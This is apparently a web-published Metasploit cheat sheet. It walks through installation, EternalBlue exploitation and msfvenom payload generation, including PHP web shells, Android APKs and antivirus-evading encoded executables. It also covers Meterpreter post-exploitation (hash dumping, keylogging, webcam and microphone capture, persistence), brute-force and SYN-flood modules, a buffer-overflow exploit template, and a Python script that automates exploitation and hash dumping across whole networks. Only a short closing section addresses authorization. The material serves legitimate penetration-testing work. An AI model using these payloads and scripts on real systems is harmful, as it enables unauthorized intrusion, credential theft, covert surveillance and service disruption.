# Metasploit Cheat Sheet advanced

## Overview

Metasploit is the world's most widely used penetration testing framework, providing a comprehensive platform for developing, testing, and executing exploit code against remote target systems. Originally created by H.D. Moore and now maintained by Rapid7, Metasploit has evolved into the de facto standard for penetration testing and vulnerability assessment, offering an extensive collection of exploits, payloads, encoders, and auxiliary modules that enable security professionals to identify, validate, and demonstrate security vulnerabilities across diverse computing environments. The framework's modular architecture and extensive database of known exploits make it an indispensable tool for ethical hackers, security researchers, and penetration testers worldwide.

The core strength of Metasploit lies in its comprehensive exploit development and deployment capabilities, combining a vast repository of proven exploits with sophisticated payload generation and delivery mechanisms. The framework includes thousands of exploits targeting various operating systems, applications, and network services, along with hundreds of payloads ranging from simple command shells to advanced persistent access mechanisms. Metasploit's intelligent target detection and exploit selection capabilities enable automated vulnerability assessment workflows, while its advanced evasion techniques and encoding options help bypass modern security controls and antivirus systems.

Metasploit's enterprise-grade features include distributed testing capabilities, comprehensive reporting and documentation tools, integration with vulnerability scanners and security information systems, and extensive customization options for specialized testing scenarios. The framework supports multiple interfaces including command-line, web-based, and API access, enabling integration with automated security testing pipelines and custom security tools. With its active development community, regular updates incorporating the latest vulnerabilities and exploits, and proven track record in professional security assessments, Metasploit remains the cornerstone framework for penetration testing and security validation across organizations of all sizes.

## Installation

### Ubuntu/Debian Installation

Installing Metasploit on Ubuntu/Debian systems:

```bash
# Update system packages
sudo apt update && sudo apt upgrade -y

# Install dependencies
sudo apt install -y curl wget gnupg2 software-properties-common

# Add Rapid7 repository
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
sudo ./msfinstall

# Alternative: Install from package
wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
chmod +x metasploit-latest-linux-x64-installer.run
sudo ./metasploit-latest-linux-x64-installer.run

# Install from source (development version)
sudo apt install -y git ruby ruby-dev build-essential zlib1g-dev \
    libreadline-dev libssl-dev libpq-dev sqlite3 libsqlite3-dev \
    libpcap-dev autoconf postgresql postgresql-contrib

# Clone repository
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework

# Install Ruby dependencies
gem install bundler
bundle install

# Initialize database
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo -u postgres createuser -s msf
sudo -u postgres createdb msf_database

# Configure database
cat > config/database.yml << 'EOF'
production:
  adapter: postgresql
  database: msf_database
  username: msf
  password:
  host: localhost
  port: 5432
  pool: 5
  timeout: 5
EOF

# Initialize Metasploit database
./msfconsole -q -x "db_status; exit"

# Verify installation
msfconsole --version
```

### CentOS/RHEL Installation

```bash
# Install EPEL repository
sudo yum install -y epel-release

# Install dependencies
sudo yum install -y curl wget git ruby ruby-devel gcc gcc-c++ \
    make autoconf readline-devel openssl-devel zlib-devel \
    postgresql postgresql-server postgresql-contrib

# Initialize PostgreSQL
sudo postgresql-setup initdb
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Install Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
sudo ./msfinstall

# Configure database
sudo -u postgres createuser -s msf
sudo -u postgres createdb msf_database

# Verify installation
msfconsole --version
```

### macOS Installation

```bash
# Install using Homebrew
brew install metasploit

# Install dependencies
brew install postgresql
brew services start postgresql

# Create database
createuser -s msf
createdb msf_database

# Alternative: Install from installer
# Download from https://www.metasploit.com/download
# Run installer package

# Verify installation
msfconsole --version
```

### Windows Installation

```bash
# Download Windows installer
# https://www.metasploit.com/download

# Run installer as Administrator
# Follow installation wizard

# Install PostgreSQL
# Download from https://www.postgresql.org/download/windows/
# Configure database during installation

# Verify installation
# Open Command Prompt or PowerShell
msfconsole --version

# Alternative: Install with Chocolatey
choco install metasploit

# Configure Windows Defender exclusions
# Add Metasploit installation directory to exclusions
```

### Docker Installation

Running Metasploit in Docker:

```bash
# Pull official Metasploit image
docker pull metasploitframework/metasploit-framework

# Run Metasploit console
docker run --rm -it metasploitframework/metasploit-framework

# Run with persistent data
docker run --rm -it \
    -v $(pwd)/msf_data:/home/msf/.msf4 \
    metasploitframework/metasploit-framework

# Create custom Dockerfile
cat > Dockerfile.metasploit << 'EOF'
FROM metasploitframework/metasploit-framework

# Install additional tools
USER root
RUN apt-get update && apt-get install -y \
    nmap \
    nikto \
    sqlmap \
    && rm -rf /var/lib/apt/lists/*

# Switch back to msf user
USER msf

# Set working directory
WORKDIR /home/msf

CMD ["msfconsole"]
EOF

# Build custom image
docker build -f Dockerfile.metasploit -t metasploit-custom .

# Run with network access
docker run --rm -it --net=host metasploit-custom
```

## Basic Usage

### Metasploit Console

Getting started with msfconsole:

```bash
# Start Metasploit console
msfconsole

# Basic commands
help                    # Show help
version                 # Show version information
exit                    # Exit console

# Database commands
db_status              # Check database connection
db_connect             # Connect to database
db_disconnect          # Disconnect from database
db_rebuild_cache       # Rebuild module cache

# Workspace management
workspace              # List workspaces
workspace -a test      # Add workspace
workspace test         # Switch to workspace
workspace -d test      # Delete workspace

# Module management
show exploits          # List all exploits
show payloads          # List all payloads
show auxiliary         # List auxiliary modules
show post             # List post-exploitation modules
show encoders         # List encoders
show nops             # List NOP generators

# Search modules
search type:exploit platform:windows
search cve:2017
search ms17-010
search apache
```

### Target Discovery

Discovering and scanning targets:

```bash
# Network discovery with auxiliary modules
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
run

# Port scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 1-1000
run

# Service identification
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.100
run

# SMB scanning
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Database services
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.168.1.100
run

# Web application scanning
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# Vulnerability scanning
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Save scan results
db_nmap -sS -O 192.168.1.0/24
hosts                  # View discovered hosts
services              # View discovered services
vulns                 # View discovered vulnerabilities
```

### Exploitation

Basic exploitation workflow:

```bash
# Select exploit module
use exploit/windows/smb/ms17_010_eternalblue
show options          # Display required options
show targets          # Display available targets
show payloads         # Display compatible payloads

# Configure exploit
set RHOSTS 192.168.1.100
set RPORT 445
set TARGET 0

# Select payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Verify configuration
show options
check                 # Check if target is vulnerable

# Execute exploit
exploit
# or
run

# Alternative: Use exploit command directly
exploit -j            # Run as job
exploit -z            # Don't interact with session

# Session management
sessions              # List active sessions
sessions -i 1         # Interact with session 1
sessions -k 1         # Kill session 1
sessions -K           # Kill all sessions
```

### Payload Generation

Generating standalone payloads:

```bash
# Generate Windows executable
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    -f exe -o payload.exe

# Generate Linux executable
msfvenom -p linux/x86/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    -f elf -o payload.elf

# Generate PHP web shell
msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    -f raw -o shell.php

# Generate PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    -f psh -o payload.ps1

# Generate Android APK
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    -o payload.apk

# Encoded payloads (AV evasion)
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    -e x86/shikata_ga_nai -i 3 \
    -f exe -o encoded_payload.exe

# List available formats
msfvenom --list formats

# List available encoders
msfvenom --list encoders

# List available payloads
msfvenom --list payloads
```

## Advanced Features

### Meterpreter

Advanced Meterpreter usage:

```bash
# Basic Meterpreter commands
sysinfo               # System information
getuid                # Current user
getpid                # Current process ID
ps                    # Process list
pwd                   # Current directory
ls                    # List files
cd /path              # Change directory

# File operations
download file.txt     # Download file
upload file.txt       # Upload file
edit file.txt         # Edit file
cat file.txt          # Display file content
rm file.txt           # Delete file
mkdir newdir          # Create directory

# System operations
shell                 # Drop to system shell
execute -f cmd.exe -i # Execute command interactively
migrate 1234          # Migrate to process ID 1234
kill 1234             # Kill process ID 1234
reboot                # Reboot system
shutdown              # Shutdown system

# Network operations
netstat               # Network connections
route                 # Routing table
arp                   # ARP table
portfwd add -l 8080 -p 80 -r 192.168.1.100  # Port forwarding

# Privilege escalation
getsystem             # Attempt privilege escalation
getprivs              # Get current privileges

# Persistence
run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Information gathering
hashdump              # Dump password hashes
screenshot            # Take screenshot
webcam_snap           # Take webcam photo
record_mic            # Record microphone
keyscan_start         # Start keylogger
keyscan_dump          # Dump keystrokes
keyscan_stop          # Stop keylogger

# Registry operations (Windows)
reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion -v ProductName
reg setval -k HKLM\\Software\\Test -v TestValue -t REG_SZ -d "Test Data"
reg deleteval -k HKLM\\Software\\Test -v TestValue

# Background session
background            # Background current session
```

### Post-Exploitation

Post-exploitation modules:

```bash
# Load post-exploitation module
use post/windows/gather/hashdump
set SESSION 1
run

# System information gathering
use post/windows/gather/enum_system
use post/linux/gather/enum_system
use post/osx/gather/enum_osx

# Network enumeration
use post/windows/gather/enum_domain
use post/windows/gather/enum_shares
use post/multi/gather/enum_network

# Credential harvesting
use post/windows/gather/credentials/windows_autologin
use post/windows/gather/smart_hashdump
use post/linux/gather/hashdump

# Privilege escalation
use post/windows/escalate/getsystem
use post/linux/escalate/cve_2021_4034

# Persistence mechanisms
use post/windows/manage/persistence_exe
use post/linux/manage/sshkey_persistence

# Data exfiltration
use post/windows/gather/enum_files
use post/multi/gather/firefox_creds
use post/multi/gather/chrome_cookies

# Lateral movement
use post/windows/gather/enum_domain_users
use post/windows/gather/enum_computers
```

### Auxiliary Modules

Using auxiliary modules for various tasks:

```bash
# Brute force attacks
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# FTP brute force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME admin
set PASS_FILE passwords.txt
run

# HTTP brute force
use auxiliary/scanner/http/http_login
set RHOSTS 192.168.1.100
set AUTH_URI /admin/login
set USERNAME admin
set PASS_FILE passwords.txt
run

# Database attacks
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/postgres/postgres_login

# Denial of service
use auxiliary/dos/tcp/synflood
set RHOST 192.168.1.100
run

# Information gathering
use auxiliary/gather/shodan_search
set SHODAN_APIKEY your_api_key
set QUERY "apache"
run

# Fuzzing
use auxiliary/fuzzers/http/http_form_field
set RHOSTS 192.168.1.100
set URI /login.php
run

# SNMP enumeration
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.1.0/24
run
```

### Custom Modules

Creating custom Metasploit modules:

```ruby
# Custom auxiliary module template
# Save as ~/.msf4/modules/auxiliary/scanner/custom/my_scanner.rb

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = \\\\{\\\\})
    super(update_info(info,
      'Name'           => 'Custom Scanner Module',
      'Description'    => 'Custom scanner for demonstration',
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['URL', 'http://example.com']
      ],
      'DisclosureDate' => '2023-01-01'
    ))

    register_options([
      Opt::RPORT(80),
      OptString.new('URI', [true, 'URI to scan', '/']),
      OptString.new('KEYWORD', [true, 'Keyword to search for', 'admin'])
    ])
  end

  def run_host(target_host)
    begin
      connect

      request = "GET #\\\\{datastore['URI']\\\\} HTTP/1.1\r\n"
      request << "Host: #\\\\{target_host\\\\}\r\n"
      request << "Connection: close\r\n\r\n"

      sock.put(request)
      response = sock.recv(1024)

      if response.include?(datastore['KEYWORD'])
        print_good("#\\\\{target_host\\\\}:#\\\\{rport\\\\} - Found keyword: #\\\\{datastore['KEYWORD']\\\\}")

        report_note(
          host: target_host,
          port: rport,
          proto: 'tcp',
          type: 'custom_scan',
          data: "Keyword '#\\\\{datastore['KEYWORD']\\\\}' found"
        )
      else
        print_status("#\\\\{target_host\\\\}:#\\\\{rport\\\\} - Keyword not found")
      end

    rescue ::Exception => e
      print_error("#\\\\{target_host\\\\}:#\\\\{rport\\\\} - Error: #\\\\{e.message\\\\}")
    ensure
      disconnect
    end
  end
end
```

```ruby
# Custom exploit module template
# Save as ~/.msf4/modules/exploits/custom/my_exploit.rb

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = \\\\{\\\\})
    super(update_info(info,
      'Name'           => 'Custom Exploit Module',
      'Description'    => 'Custom exploit for demonstration',
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2023-0001'],
        ['URL', 'http://example.com']
      ],
      'Platform'       => 'linux',
      'Targets'        => [
        ['Linux x86', \\\\{ 'Ret' => 0x08048484 \\\\}]
      ],
      'Payload'        => \\\\{
        'Space'    => 400,
        'BadChars' => "\x00\x0a\x0d\x20"
      \\\\},
      'DisclosureDate' => '2023-01-01',
      'DefaultTarget'  => 0
    ))

    register_options([
      Opt::RPORT(9999),
      OptString.new('COMMAND', [true, 'Command to execute', 'id'])
    ])
  end

  def check
    begin
      connect
      sock.put("TEST\n")
      response = sock.recv(1024)
      disconnect

      if response.include?("VULNERABLE")
        return Exploit::CheckCode::Vulnerable
      else
        return Exploit::CheckCode::Safe
      end
    rescue
      return Exploit::CheckCode::Unknown
    end
  end

  def exploit
    begin
      connect

      buffer = "A" * 260
      buffer << [target.ret].pack('V')
      buffer << payload.encoded

      print_status("Sending exploit buffer...")
      sock.put(buffer)

      handler
      disconnect

    rescue ::Exception => e
      print_error("Exploit failed: #\\\\{e.message\\\\}")
    end
  end
end
```

## Automation Scripts

### Automated Penetration Testing Script

```python
#!/usr/bin/env python3
# Automated penetration testing with Metasploit

import subprocess
import json
import time
import sys
import os
import argparse
from datetime import datetime

class MetasploitAutomator:
    def __init__(self, msf_path="msfconsole"):
        self.msf_path = msf_path
        self.workspace = f"auto_test_\\\\{int(time.time())\\\\}"
        self.results = \\\\{\\\\}

    def execute_msf_command(self, commands, timeout=300):
        """Execute Metasploit commands"""
        if isinstance(commands, str):
            commands = [commands]

        # Create resource file
        resource_file = f"/tmp/msf_commands_\\\\{int(time.time())\\\\}.rc"
        with open(resource_file, 'w') as f:
            for cmd in commands:
                f.write(f"\\\\{cmd\\\\}\n")
            f.write("exit\n")

        try:
            # Execute Metasploit with resource file
            result = subprocess.run([
                self.msf_path, "-q", "-r", resource_file
            ], capture_output=True, text=True, timeout=timeout)

            # Clean up
            os.remove(resource_file)

            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            print(f"Command timed out after \\\\{timeout\\\\} seconds")
            return "", "Timeout", 1
        except Exception as e:
            print(f"Error executing command: \\\\{e\\\\}")
            return "", str(e), 1

    def setup_workspace(self):
        """Setup Metasploit workspace"""
        commands = [
            "db_status",
            f"workspace -a \\\\{self.workspace\\\\}",
            f"workspace \\\\{self.workspace\\\\}"
        ]

        stdout, stderr, returncode = self.execute_msf_command(commands)

        if returncode == 0:
            print(f"Workspace '\\\\{self.workspace\\\\}' created successfully")
            return True
        else:
            print(f"Failed to create workspace: \\\\{stderr\\\\}")
            return False

    def network_discovery(self, target_range):
        """Perform network discovery"""
        print(f"Starting network discovery for \\\\{target_range\\\\}")

        commands = [
            f"workspace \\\\{self.workspace\\\\}",
            f"db_nmap -sn \\\\{target_range\\\\}",
            "hosts -c address,name,os_name,purpose",
            "services -c port,proto,name,state"
        ]

        stdout, stderr, returncode = self.execute_msf_command(commands, timeout=600)

        if returncode == 0:
            print("Network discovery completed")
            self.results['discovery'] = stdout
            return True
        else:
            print(f"Network discovery failed: \\\\{stderr\\\\}")
            return False

    def vulnerability_scan(self, targets):
        """Perform vulnerability scanning"""
        print(f"Starting vulnerability scan for \\\\{targets\\\\}")

        scan_modules = [
            "auxiliary/scanner/smb/smb_ms17_010",
            "auxiliary/scanner/http/http_version",
            "auxiliary/scanner/ssh/ssh_version",
            "auxiliary/scanner/ftp/ftp_version",
            "auxiliary/scanner/mysql/mysql_version"
        ]

        commands = [f"workspace \\\\{self.workspace\\\\}"]

        for module in scan_modules:
            commands.extend([
                f"use \\\\{module\\\\}",
                f"set RHOSTS \\\\{targets\\\\}",
                "run",
                "back"
            ])

        commands.append("vulns")

        stdout, stderr, returncode = self.execute_msf_command(commands, timeout=1200)

        if returncode == 0:
            print("Vulnerability scan completed")
            self.results['vulnerabilities'] = stdout
            return True
        else:
            print(f"Vulnerability scan failed: \\\\{stderr\\\\}")
            return False

    def automated_exploitation(self, targets):
        """Perform automated exploitation"""
        print(f"Starting automated exploitation for \\\\{targets\\\\}")

        # Common exploits to try
        exploits = [
            \\\\{
                'module': 'exploit/windows/smb/ms17_010_eternalblue',
                'payload': 'windows/x64/meterpreter/reverse_tcp',
                'port': 445
            \\\\},
            \\\\{
                'module': 'exploit/linux/ssh/ssh_login',
                'payload': 'linux/x86/meterpreter/reverse_tcp',
                'port': 22
            \\\\},
            \\\\{
                'module': 'exploit/multi/http/apache_struts2_content_type_ognl',
                'payload': 'linux/x86/meterpreter/reverse_tcp',
                'port': 80
            \\\\}
        ]

        successful_exploits = []

        for exploit in exploits:
            commands = [
                f"workspace \\\\{self.workspace\\\\}",
                f"use \\\\{exploit['module']\\\\}",
                f"set RHOSTS \\\\{targets\\\\}",
                f"set RPORT \\\\{exploit['port']\\\\}",
                f"set PAYLOAD \\\\{exploit['payload']\\\\}",
                "set LHOST 0.0.0.0",  # Auto-detect
                "set LPORT 4444",
                "check",
                "exploit -j",  # Run as job
                "sleep 10",
                "sessions -l"
            ]

            stdout, stderr, returncode = self.execute_msf_command(commands, timeout=300)

            if "session" in stdout.lower() and "opened" in stdout.lower():
                print(f"Successful exploitation with \\\\{exploit['module']\\\\}")
                successful_exploits.append(exploit)
            else:
                print(f"Exploitation failed with \\\\{exploit['module']\\\\}")

        self.results['exploits'] = successful_exploits
        return len(successful_exploits) > 0

    def post_exploitation(self):
        """Perform post-exploitation activities"""
        print("Starting post-exploitation activities")

        commands = [
            f"workspace \\\\{self.workspace\\\\}",
            "sessions -l",
            "sessions -i 1",  # Interact with first session
            "sysinfo",
            "getuid",
            "ps",
            "hashdump",
            "background"
        ]

        stdout, stderr, returncode = self.execute_msf_command(commands, timeout=300)

        if returncode == 0:
            print("Post-exploitation completed")
            self.results['post_exploitation'] = stdout
            return True
        else:
            print(f"Post-exploitation failed: \\\\{stderr\\\\}")
            return False

    def generate_report(self, output_file="metasploit_report.html"):
        """Generate comprehensive report"""
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Metasploit Automated Penetration Test Report</title>
    <style>
        body \\\\{\\\\{ font-family: Arial, sans-serif; margin: 20px; \\\\}\\\\}
        .section \\\\{\\\\{ margin: 20px 0; padding: 15px; border: 1px solid #ddd; \\\\}\\\\}
        .critical \\\\{\\\\{ color: red; font-weight: bold; \\\\}\\\\}
        .warning \\\\{\\\\{ color: orange; font-weight: bold; \\\\}\\\\}
        .info \\\\{\\\\{ color: blue; \\\\}\\\\}
        .success \\\\{\\\\{ color: green; font-weight: bold; \\\\}\\\\}
        table \\\\{\\\\{ border-collapse: collapse; width: 100%; \\\\}\\\\}
        th, td \\\\{\\\\{ border: 1px solid #ddd; padding: 8px; text-align: left; \\\\}\\\\}
        th \\\\{\\\\{ background-color: #f2f2f2; \\\\}\\\\}
        pre \\\\{\\\\{ background: #f5f5f5; padding: 10px; overflow-x: auto; \\\\}\\\\}
    </style>
</head>
<body>
    <h1>Metasploit Automated Penetration Test Report</h1>
    <p>Generated: \\\\{datetime.now().isoformat()\\\\}</p>
    <p>Workspace: \\\\{self.workspace\\\\}</p>

    <div class="section">
        <h2>Executive Summary</h2>
        <ul>
            <li>Successful Exploits: \\\\{len(self.results.get('exploits', []))\\\\}</li>
            <li>Vulnerabilities Found: \\\\{self.count_vulnerabilities()\\\\}</li>
            <li>Hosts Discovered: \\\\{self.count_hosts()\\\\}</li>
        </ul>
    </div>

    <div class="section">
        <h2>Network Discovery Results</h2>
        <pre>\\\\{self.results.get('discovery', 'No discovery data available')\\\\}</pre>
    </div>

    <div class="section">
        <h2 class="critical">Successful Exploits</h2>
        <table>
            <tr><th>Module</th><th>Payload</th><th>Port</th></tr>
"""

        for exploit in self.results.get('exploits', []):
            html_content += f"""
            <tr>
                <td>\\\\{exploit['module']\\\\}</td>
                <td>\\\\{exploit['payload']\\\\}</td>
                <td>\\\\{exploit['port']\\\\}</td>
            </tr>"""

        html_content += """
        </table>
    </div>

    <div class="section">
        <h2>Vulnerability Scan Results</h2>
        <pre>\\\\{\\\\}</pre>
    </div>

    <div class="section">
        <h2>Post-Exploitation Results</h2>
        <pre>\\\\{\\\\}</pre>
    </div>

    <div class="section">
        <h2>Recommendations</h2>
        <ul>
            <li>Patch all identified vulnerabilities immediately</li>
            <li>Implement network segmentation</li>
            <li>Deploy endpoint detection and response (EDR) solutions</li>
            <li>Conduct regular security assessments</li>
            <li>Implement multi-factor authentication</li>
            <li>Monitor network traffic for suspicious activities</li>
        </ul>
    </div>
</body>
</html>
""".format(
            self.results.get('vulnerabilities', 'No vulnerability data available'),
            self.results.get('post_exploitation', 'No post-exploitation data available')
        )

        with open(output_file, 'w') as f:
            f.write(html_content)

        print(f"Report generated: \\\\{output_file\\\\}")
        return output_file

    def count_vulnerabilities(self):
        """Count vulnerabilities from scan results"""
        vuln_data = self.results.get('vulnerabilities', '')
        return vuln_data.count('Vulnerable') + vuln_data.count('VULNERABLE')

    def count_hosts(self):
        """Count discovered hosts"""
        discovery_data = self.results.get('discovery', '')
        return discovery_data.count('address')

    def cleanup(self):
        """Clean up workspace and sessions"""
        commands = [
            "sessions -K",  # Kill all sessions
            f"workspace -d \\\\{self.workspace\\\\}"
        ]

        self.execute_msf_command(commands)
        print("Cleanup completed")

    def run_full_assessment(self, target_range, output_dir="/tmp/metasploit_assessment"):
        """Run complete automated assessment"""
        print("Starting automated Metasploit assessment...")

        # Create output directory
        os.makedirs(output_dir, exist_ok=True)

        try:
            # Setup workspace
            if not self.setup_workspace():
                return False

            # Network discovery
            if not self.network_discovery(target_range):
                return False

            # Vulnerability scanning
            if not self.vulnerability_scan(target_range):
                return False

            # Automated exploitation
            self.automated_exploitation(target_range)

            # Post-exploitation
            self.post_exploitation()

            # Generate report
            report_file = os.path.join(output_dir, "metasploit_report.html")
            self.generate_report(report_file)

            print("Automated assessment completed successfully")
            return True

        except Exception as e:
            print(f"Assessment failed: \\\\{e\\\\}")
            return False
        finally:
            self.cleanup()

def main():
    parser = argparse.ArgumentParser(description='Metasploit Automation')
    parser.add_argument('--target', required=True, help='Target range (e.g., 192.168.1.0/24)')
    parser.add_argument('--output', default='/tmp/metasploit_assessment', help='Output directory')
    parser.add_argument('--msf-path', default='msfconsole', help='Path to msfconsole')

    args = parser.parse_args()

    # Initialize automator
    automator = MetasploitAutomator(args.msf_path)

    # Run assessment
    success = automator.run_full_assessment(args.target, args.output)

    if success:
        print("Assessment completed successfully")
    else:
        print("Assessment failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

## Integration Examples

### CI/CD Integration

```yaml
# Jenkins Pipeline for Metasploit Integration
pipeline \\\\{
    agent \\\\{
        label 'security-testing'
    \\\\}

    environment \\\\{
        MSF_DATABASE_URL = 'postgresql://msf:password@localhost/msf_database'
        TARGET_NETWORK = '192.168.100.0/24'
    \\\\}

    stages \\\\{
        stage('Setup Environment') \\\\{
            steps \\\\{
                script \\\\{
                    // Start PostgreSQL and initialize Metasploit
                    sh '''
                        sudo systemctl start postgresql
                        msfdb init
                        msfconsole -q -x "db_status; exit"
                    '''
                \\\\}
            \\\\}
        \\\\}

        stage('Network Discovery') \\\\{
            steps \\\\{
                script \\\\{
                    // Perform network discovery
                    sh '''
                        cat > discovery.rc << 'EOF'
workspace -a jenkins_test
db_nmap -sn $\\\\{TARGET_NETWORK\\\\}
hosts -o hosts.xml
exit
EOF
                        msfconsole -q -r discovery.rc
                    '''
                \\\\}
            \\\\}
        \\\\}

        stage('Vulnerability Assessment') \\\\{
            steps \\\\{
                script \\\\{
                    // Run vulnerability scans
                    sh '''
                        cat > vuln_scan.rc << 'EOF'
workspace jenkins_test
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS $\\\\{TARGET_NETWORK\\\\}
run
vulns -o vulns.xml
exit
EOF
                        msfconsole -q -r vuln_scan.rc
                    '''
                \\\\}
            \\\\}
        \\\\}

        stage('Generate Report') \\\\{
            steps \\\\{
                script \\\\{
                    // Generate security report
                    sh '''
                        python3 generate_msf_report.py \
                            --hosts hosts.xml \
                            --vulns vulns.xml \
                            --output security_report.html
                    '''
                \\\\}
            \\\\}
        \\\\}
    \\\\}

    post \\\\{
        always \\\\{
            // Archive results
            archiveArtifacts artifacts: '*.xml,*.html', fingerprint: true

            // Publish report
            publishHTML([
                allowMissing: false,
                alwaysLinkToLastBuild: true,
                keepAll: true,
                reportDir: '.',
                reportFiles: 'security_report.html',
                reportName: 'Security Assessment Report'
            ])

            // Clean up
            sh '''
                msfconsole -q -x "workspace -d jenkins_test; exit"
                rm -f *.rc *.xml
            '''
        \\\\}

        failure \\\\{
            // Send notification
            emailext (
                subject: "Security Assessment Failed: $\\\\{env.JOB_NAME\\\\} - $\\\\{env.BUILD_NUMBER\\\\}",
                body: "Security assessment failed. Check console output for details.",
                to: "$\\\\{env.SECURITY_TEAM_EMAIL\\\\}"
            )
        \\\\}
    \\\\}
\\\\}
```

## Troubleshooting

### Common Issues

**Database Connection Issues:**

```bash
# Check database status
msfconsole -q -x "db_status; exit"

# Reinitialize database
msfdb delete
msfdb init

# Manual database setup
sudo -u postgres createuser -s msf
sudo -u postgres createdb msf_database

# Configure database connection
cat > ~/.msf4/database.yml << 'EOF'
production:
  adapter: postgresql
  database: msf_database
  username: msf
  password:
  host: localhost
  port: 5432
  pool: 5
  timeout: 5
EOF
```

**Module Loading Issues:**

```bash
# Reload modules
msfconsole -q -x "reload_all; exit"

# Check module paths
msfconsole -q -x "show advanced; exit"|grep ModulePath

# Update Metasploit
msfupdate

# Clear module cache
rm -rf ~/.msf4/store/modules_metadata.json
```

**Payload Generation Issues:**

```bash
# Check available encoders
msfvenom --list encoders

# Test payload generation
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=127.0.0.1 LPORT=4444 \
    -f exe --platform windows -a x86 \
    -o test_payload.exe

# Debug payload issues
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=127.0.0.1 LPORT=4444 \
    -f raw|hexdump -C
```

### Performance Optimization

Optimizing Metasploit performance:

```bash
# Database optimization
# Edit postgresql.conf
sudo nano /etc/postgresql/*/main/postgresql.conf

# Increase shared_buffers
shared_buffers = 256MB

# Increase work_mem
work_mem = 4MB

# Restart PostgreSQL
sudo systemctl restart postgresql

# Metasploit optimization
# Increase Ruby memory limit
export RUBY_HEAP_MIN_SLOTS=800000
export RUBY_HEAP_SLOTS_INCREMENT=300000
export RUBY_HEAP_SLOTS_GROWTH_FACTOR=1
export RUBY_GC_MALLOC_LIMIT=79000000

# Start Metasploit with optimizations
msfconsole
```

## Security Considerations

### Operational Security

**Legal and Ethical Usage:**

- Only use Metasploit against systems you own or have explicit permission to test

- Understand legal requirements for penetration testing in your jurisdiction

- Implement proper authorization and documentation procedures

- Respect scope limitations and rules of engagement

- Maintain confidentiality of discovered vulnerabilities

**Data Protection:**

- Encrypt Metasploit databases containing sensitive information

- Implement secure data retention policies for assessment results

- Control access to exploitation tools and results

- Secure transmission of assessment reports and findings

- Regular cleanup of temporary files and session data

### Defensive Considerations

**Detection and Prevention:**

- Monitor for Metasploit signatures and indicators of compromise

- Implement network intrusion detection systems

- Deploy endpoint detection and response solutions

- Regular security assessments and vulnerability management

- Security awareness training for development and operations teams

## References

1. [Metasploit Official Documentation](https://docs.metasploit.com/)

1. [Metasploit GitHub Repository](https://github.com/rapid7/metasploit-framework)

1. [Metasploit Unleashed Course](https://www.offensive-security.com/metasploit-unleashed/)

1. [Rapid7 Vulnerability Database](https://www.rapid7.com/db/)

1. [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

Source: https://1337skills.com/cheatsheets/metasploit/
